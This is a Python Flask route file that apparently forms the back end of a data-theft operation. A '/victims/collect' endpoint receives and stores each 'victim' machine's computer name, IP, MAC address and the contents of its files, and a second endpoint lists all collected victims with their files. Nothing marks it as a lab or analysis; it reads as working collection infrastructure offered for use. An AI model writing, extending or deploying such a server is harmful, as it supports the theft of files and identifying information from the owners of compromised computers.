from flask import Blueprint, jsonify, request

from services.victims_service import ValidationError, create_victim_with_files, list_victims_with_files


victims_bp = Blueprint("victims", __name__, url_prefix="/victims")


def _serialize_file(file_obj) -> dict:
    return {
        "id": file_obj.id,
        "name": file_obj.name,
        "path": file_obj.path,
        "content": file_obj.content,
        "victim_id": file_obj.victim_id,
        "created_at": file_obj.created_at.isoformat() if file_obj.created_at else None,
        "updated_at": file_obj.updated_at.isoformat() if file_obj.updated_at else None,
    }


def _serialize_victim(victim_obj) -> dict:
    return {
        "id": victim_obj.id,
        "computer_name": victim_obj.computer_name,
        "ip": victim_obj.ip,
        "mac_address": victim_obj.mac_address,
        "created_at": victim_obj.created_at.isoformat() if victim_obj.created_at else None,
        "updated_at": victim_obj.updated_at.isoformat() if victim_obj.updated_at else None,
        "files": [_serialize_file(file_obj) for file_obj in victim_obj.files],
    }


@victims_bp.post("/collect")
def collect_data():
    payload = request.get_json(silent=True) or {}

    try:
        victim = create_victim_with_files(payload)
        return jsonify({"victim": _serialize_victim(victim)}), 201
    except ValidationError as exc:
        return jsonify({"error": str(exc)}), 400
    except Exception as exc:
        return jsonify({"error": "failed_to_save_data", "detail": str(exc)}), 500


@victims_bp.get("")

def get_all_victims_with_files():
    victims = list_victims_with_files()
    return jsonify(
        {
            "count": len(victims),
            "victims": [_serialize_victim(victim) for victim in victims],
        }
    ), 200